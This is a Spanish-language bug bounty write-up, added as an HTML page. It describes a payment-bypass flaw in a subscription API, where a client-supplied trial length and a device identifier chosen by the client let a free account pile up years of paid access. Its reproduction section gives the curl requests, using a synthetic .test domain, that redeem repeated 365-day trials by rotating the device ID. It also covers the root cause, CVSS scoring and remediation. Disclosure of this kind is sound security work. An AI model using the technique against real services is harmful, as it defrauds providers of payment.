@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payment bypass en una API de suscripciones | ZsZsec</title>
+  <meta name="description" content="Análisis de un fallo de lógica de negocio que permitía convertir cuentas gratuitas en suscripciones activas y extender su duración de forma acumulativa." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="canonical" href="https://zszsec.github.io/bug-bounty/payment-bypass-trial-entitlement.html" />
+  <meta property="og:title" content="Payment bypass en una API de suscripciones" />
+  <meta property="og:description" content="Una prueba gratuita controlada por el cliente permitía activar cuentas de pago y acumular años de suscripción." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/bug-bounty/payment-bypass-trial-entitlement.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Payment bypass en una API de suscripciones" />
+  <meta name="twitter:description" content="Fallo de lógica de negocio que permitía activar cuentas de pago y extender su duración." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "Payment bypass en una API de suscripciones: pruebas gratuitas controladas por el cliente",
+    "description": "Análisis de un fallo de lógica de negocio que permitía convertir cuentas gratuitas en suscripciones activas y extender su duración de forma acumulativa.",
+    "author": {
+      "@type": "Person",
+      "name": "Santiago Bedoya",
+      "alternateName": "ZsZsec",
+      "url": "https://zszsec.github.io/sobre-mi.html"
+    },
+    "mainEntityOfPage": "https://zszsec.github.io/bug-bounty/payment-bypass-trial-entitlement.html"
+  }
+  </script>
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../bug-bounty.html" aria-current="page">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">bug bounty / case study</p>
+      <h1>Payment bypass<span>_</span></h1>
+      <div class="writeup-meta"><span>CWE-841</span><span>High</span></div>
+      <div class="tag-row"><span class="tag">Web Security</span><span class="tag">Business Logic</span><span class="tag">Payment Bypass</span><span class="tag">Entitlement Management</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <p>Encontré esta vulnerabilidad durante pruebas autorizadas en un programa de bug bounty self-hosted. El fallo se encontraba en la lógica utilizada para conceder pruebas gratuitas y permitía convertir una cuenta sin suscripción en una cuenta con acceso de pago, sin completar ninguna transacción.</p>
+
+        <p>La API aceptaba la duración de la prueba desde el cliente y utilizaba un identificador de dispositivo igualmente controlado por el usuario para impedir canjes repetidos.</p>
+
+        <p>Combinando ambos comportamientos, una cuenta nueva podía solicitar periodos sucesivos de hasta 365 días, cada uno con un identificador diferente. Dos solicitudes fueron suficientes para obtener aproximadamente dos años de servicio.</p>
+
+        <blockquote><p>El programa se mantiene anónimo y los ejemplos utilizan un dominio <code>.test</code> y datos sintéticos.</p></blockquote>
+
+        <h2>Ficha técnica</h2>
+
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Categoría</td><td>Fallo de lógica de negocio / payment bypass</td></tr>
+            <tr><td>CWE</td><td>CWE-841</td></tr>
+            <tr><td>Criticidad</td><td>High</td></tr>
+            <tr><td>Superficie</td><td>API de cuentas y suscripciones</td></tr>
+            <tr><td>Acceso requerido</td><td>Ninguno</td></tr>
+            <tr><td>Interacción del usuario</td><td>Ninguna</td></tr>
+            <tr><td>CVSS 3.1</td><td>8.2 High (<code>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N</code>)</td></tr>
+            <tr><td>Impacto comercial</td><td>Acceso acumulativo al servicio de pago sin realizar un pago</td></tr>
+            <tr><td>Resultado</td><td>El comportamiento dejó de ser reproducible después del reporte</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Funcionamiento esperado</h2>
+
+        <p>La aplicación ofrecía una prueba gratuita durante el registro. El cliente oficial enviaba una única solicitud con tres valores:</p>
+
+        <pre><code class="language-json">{
+  "account_code": "&lt;account identifier&gt;",
+  "device_id": "&lt;device identifier&gt;",
+  "days": 7
+}</code></pre>
+
+        <p>El servidor debía aplicar una duración fija, permitir un solo periodo de prueba por cuenta y mantener la suscripción inactiva cuando no existiera un pago o una prueba válida.</p>
+
+        <h2>Comportamiento observado</h2>
+
+        <p>El backend confiaba en dos propiedades proporcionadas por el cliente:</p>
+
+        <ol>
+          <li><code>days</code> determinaba directamente cuánto tiempo se añadía a la suscripción. El único límite observado era de 365 días por solicitud.</li>
+          <li><code>device_id</code> era la única clave empleada para evitar un segundo canje. No existía un límite equivalente asociado a la cuenta.</li>
+        </ol>
+
+        <p>Reutilizar el mismo <code>device_id</code> producía un error, pero enviar cualquier cadena nueva permitía repetir el canje. Cada solicitud modificaba el estado de la cuenta y acumulaba la duración solicitada.</p>
+
+        <h2>Causa raíz</h2>
+
+        <p>La vulnerabilidad no dependía de una validación aislada, sino de tres decisiones de diseño que se reforzaban entre sí:</p>
+
+        <ul>
+          <li>Una propiedad de seguridad, la duración de la suscripción, era controlada por el cliente.</li>
+          <li>El mecanismo antiabuso confiaba en un identificador no autenticado y elegido por el mismo cliente.</li>
+          <li>La extensión era acumulativa y no existía un límite total por cuenta.</li>
+        </ul>
+
+        <p>El backend validaba correctamente que un mismo dispositivo no pudiera utilizar dos pruebas. Sin embargo, esa restricción no protegía la suscripción porque el servidor no podía demostrar que el identificador correspondiera a un dispositivo real ni que permaneciera estable.</p>
+
+        <h2>Reproducción</h2>
+
+        <h3>1. Crear una cuenta gratuita</h3>
+
+        <pre><code class="language-bash">curl -X POST 'https://api.subscription-lab.test/v1/accounts' \
+  -H 'Content-Type: application/json' \
+  -d '{}'</code></pre>
+
+        <p>Respuesta resumida:</p>
+
+        <pre><code class="language-json">{
+  "account_code": "0000000000000001",
+  "message": "Account created"
+}</code></pre>
+
+        <h3>2. Confirmar que la cuenta no tiene acceso</h3>
+
+        <p>Antes del canje, la autenticación para utilizar el servicio era rechazada y la cuenta aparecía sin una suscripción activa:</p>
+
+        <pre><code class="language-json">{
+  "active": false,
+  "paid": false,
+  "subscription_valid": false,
+  "subscription_expires_at": null
+}</code></pre>
+
+        <p>Este control permitió demostrar que el acceso posterior no provenía de una suscripción existente.</p>
+
+        <h3>3. Solicitar 365 días de prueba</h3>
+
+        <pre><code class="language-bash">curl -X POST 'https://api.subscription-lab.test/v1/trials/redeem' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "account_code":"0000000000000001",
+    "device_id":"research-device-a",
+    "days":365
+  }'</code></pre>
+
+        <pre><code class="language-json">{
+  "message": "Trial redeemed",
+  "days_added": 365
+}</code></pre>
+
+        <h3>4. Verificar el control existente</h3>
+
+        <p>Repetir la solicitud con <code>research-device-a</code> era rechazado. Esto confirmó que existía deduplicación, pero que estaba vinculada exclusivamente al valor de <code>device_id</code>.</p>
+
+        <h3>5. Cambiar el identificador</h3>
+
+        <pre><code class="language-bash">curl -X POST 'https://api.subscription-lab.test/v1/trials/redeem' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "account_code":"0000000000000001",
+    "device_id":"research-device-b",
+    "days":365
+  }'</code></pre>
+
+        <p>La segunda solicitud también fue aceptada y añadió otros 365 días. El estado resultante era equivalente al de una cuenta con suscripción:</p>
+
+        <pre><code class="language-json">{
+  "active": true,
+  "paid": true,
+  "subscription_valid": true,
+  "subscription_expires_at": "&lt;approximately two years later&gt;"
+}</code></pre>
+
+        <h3>6. Validar el impacto</h3>
+
+        <p>Después de los canjes, la cuenta recibió credenciales de sesión y pudo completar una operación reservada a suscriptores. El mismo flujo no era accesible desde la cuenta de control antes de modificar su suscripción.</p>
+
+        <h2>Impacto</h2>
+
+        <p>Un atacante remoto podía automatizar el proceso completo:</p>
+
+        <ul>
+          <li>Crear cuentas sin proporcionar una identidad verificable.</li>
+          <li>Convertirlas en cuentas con funciones de pago.</li>
+          <li>Añadir hasta 365 días en cada solicitud.</li>
+          <li>Repetir la extensión utilizando identificadores arbitrarios.</li>
+          <li>Acceder al servicio protegido sin completar el flujo de pago.</li>
+        </ul>
+
+        <p>El hallazgo afectaba la integridad del sistema de entitlements y permitía eludir completamente el modelo de monetización.</p>
+
+        <h2>Evaluación de severidad</h2>
+
+        <p>El vector observado fue:</p>
+
+        <pre><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N = 8.2 High</code></pre>
+
+        <p>Elegí este vector porque la explotación era remota, no requería privilegios ni interacción y producía una modificación significativa del estado de suscripción. El impacto comercial era especialmente importante porque el proceso de pago podía evitarse por completo.</p>
+
+        <h2>Remediación</h2>
+
+        <p>La corrección debía trasladar todas las decisiones de entitlement al servidor:</p>
+
+        <ol>
+          <li>Definir la duración de la prueba mediante una constante o política interna y eliminar <code>days</code> del contrato público.</li>
+          <li>Registrar el uso de la prueba en la cuenta, no en un identificador proporcionado por el cliente.</li>
+          <li>Impedir extensiones acumulativas que no estén asociadas a una transacción o autorización válida.</li>
+          <li>Tratar los identificadores de dispositivo como señales auxiliares, nunca como controles de seguridad independientes.</li>
+          <li>Aplicar límites por cuenta e IP y alertar sobre canjes anómalos.</li>
+          <li>Separar explícitamente los estados <code>trial</code>, <code>paid</code> y <code>active</code> para evitar que una prueba establezca indicadores de pago.</li>
+          <li>Añadir pruebas automatizadas para canjes repetidos, dispositivos nuevos y valores de duración manipulados.</li>
+        </ol>
+
+        <h2>Resultado de la divulgación</h2>
+
+        <p>Verifiqué el comportamiento varias veces antes de reportarlo. Tiempo después repetí la misma cadena y ya no era reproducible. No recibí una confirmación formal del proveedor sobre el cambio.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
